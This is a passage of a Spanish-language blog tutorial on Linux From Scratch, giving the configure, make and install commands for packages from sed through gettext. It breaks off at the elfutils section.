&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/usr/tools/'&lt;/span&gt;                 build-aux/help2man
&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/testsuite.panic-tests.sh//'&lt;/span&gt; Makefile.in

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin

make
make html
make check

make &lt;span class=&quot;nb&quot;&gt;install
install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m755&lt;/span&gt;           /usr/share/doc/sed-4.8
&lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m644&lt;/span&gt; doc/sed.html /usr/share/doc/sed-4.8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;psmisc-en-lfs&quot;&gt;Psmisc en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/fuser   /bin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/killall /bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;iana-etc-en-lfs&quot;&gt;Iana Etc en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;bison-en-lfs&quot;&gt;Bison en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/bison-3.5.2
make
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;flex-en-lfs&quot;&gt;Flex en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/math.h/a #include &amp;lt;malloc.h&amp;gt;&quot;&lt;/span&gt; src/flexdef.h

&lt;span class=&quot;nv&quot;&gt;HELP2MAN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tools/bin/true &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/flex-2.6.4

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sv&lt;/span&gt; flex /usr/bin/lex
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;grep-en-lfs&quot;&gt;Grep en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;bash-en-lfs&quot;&gt;Bash en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;patch &lt;span class=&quot;nt&quot;&gt;-Np1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ../bash-5.0-upstream_fixes-1.patch

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr                    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/bash-5.0 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--without-bash-malloc&lt;/span&gt;            &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-installed-readline&lt;/span&gt;

make
&lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Rv&lt;/span&gt; nobody &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
su nobody &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /bin/bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PATH=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; HOME=/home make tests&quot;&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install
mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-vf&lt;/span&gt; /usr/bin/bash /bin

&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; /bin/bash &lt;span class=&quot;nt&quot;&gt;--login&lt;/span&gt; +h
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con este último comando, lo que estaremos haciendo será ejecutar el programa &lt;strong&gt;Bash&lt;/strong&gt; recientemente compilado, reemplazando así el que se está ejecutando actualmente:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bmN.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;libtool-en-lfs&quot;&gt;Libtool en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr
make
make check &lt;span class=&quot;c&quot;&gt;# Es posible que salgan errores, pero no hay de qué preocuparse&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gdbm-en-lfs&quot;&gt;GDBM en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--enable-libgdbm-compat&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gperf-en-lfs&quot;&gt;Gperf en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/gperf-3.1

make
make &lt;span class=&quot;nt&quot;&gt;-j1&lt;/span&gt; check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;expat-en-lfs&quot;&gt;Expat en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s|usr/bin/env |bin/|'&lt;/span&gt; run.sh.in

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/expat-2.2.9

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m644&lt;/span&gt; doc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;html,png,css&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /usr/share/doc/expat-2.2.9
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;inetutils-en-lfs&quot;&gt;Inetutils en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--localstatedir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/var &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-logger&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-whois&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-rcp&lt;/span&gt;        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-rexec&lt;/span&gt;      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-rlogin&lt;/span&gt;     &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-rsh&lt;/span&gt;        &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-servers&lt;/span&gt;

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;,ping,ping6,traceroute&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; /bin
&lt;span class=&quot;nb&quot;&gt;mv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; /usr/bin/ifconfig /sbin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;p&gt;Sacaremos otra Snapshot antes de compilar el siguiente paquete:&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34boh.png&quot; /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h5 id=&quot;perl-en-lfs&quot;&gt;Perl en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;127.0.0.1 localhost &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /etc/hosts

&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BUILD_ZLIB&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;False
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BUILD_BZIP2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0

sh Configure &lt;span class=&quot;nt&quot;&gt;-des&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Dprefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr                 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-Dvendorprefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr           &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-Dman1dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/man/man1 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-Dman3dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/man/man3 &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-Dpager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/bin/less -isR&quot;&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-Duseshrplib&lt;/span&gt;                  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;-Dusethreads&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install
unset &lt;/span&gt;BUILD_ZLIB BUILD_BZIP2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;xml-parser-en-lfs&quot;&gt;XML Parser en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;perl Makefile.PL
make
make &lt;span class=&quot;nb&quot;&gt;test
&lt;/span&gt;make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como veis, es importante por ello tener bien compilado previamente el paquete de &lt;strong&gt;Perl&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;intltool-en-lfs&quot;&gt;Intltool en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s:\\\${:\\\$\\{:'&lt;/span&gt; intltool-update.in

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

install&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Dm644&lt;/span&gt; doc/I18N-HOWTO /usr/share/doc/intltool-0.51.0/I18N-HOWTO
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;autoconf-en-lfs&quot;&gt;Autoconf en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'361 s/{/\\{/'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; bin/autoscan.in

./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr

make
make check &lt;span class=&quot;c&quot;&gt;# Es posible que salgan errores, pero no hay de qué preocuparse&lt;/span&gt;
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;automake-en-lfs&quot;&gt;Automake en LFS&lt;/h5&gt;

&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Este paquete puede tardar bastante, así que toca armarse una vez más de paciencia.&lt;/p&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/automake-1.16.1


make
make &lt;span class=&quot;nt&quot;&gt;-j4&lt;/span&gt; check
make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;kmod-en-lfs&quot;&gt;Kmod en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--bindir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin          &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--sysconfdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc      &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-rootlibdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/lib &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-xz&lt;/span&gt;              &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--with-zlib&lt;/span&gt;

make
make &lt;span class=&quot;nb&quot;&gt;install

&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;target &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;depmod insmod lsmod modinfo modprobe rmmod&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; ../bin/kmod /sbin/&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sfv&lt;/span&gt; kmod /bin/lsmod
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;gettext-en-lfs&quot;&gt;Gettext en LFS&lt;/h5&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./configure &lt;span class=&quot;nt&quot;&gt;--prefix&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--disable-static&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;--docdir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/doc/gettext-0.20.1

make
make check
make &lt;span class=&quot;nb&quot;&gt;install

chmod&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 0755 /usr/lib/preloadable_libintl.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.&lt;/p&gt;

&lt;h5 id=&quot;libelf-de-elfutils-en-lfs&quot;&gt;Libelf de Elfutils en LFS&lt;/h5&gt;

&lt;p&gt;Este paquete corresponde al que tiene nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;elfutils-0.178.tar.bz2&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:&lt;/p&gt;

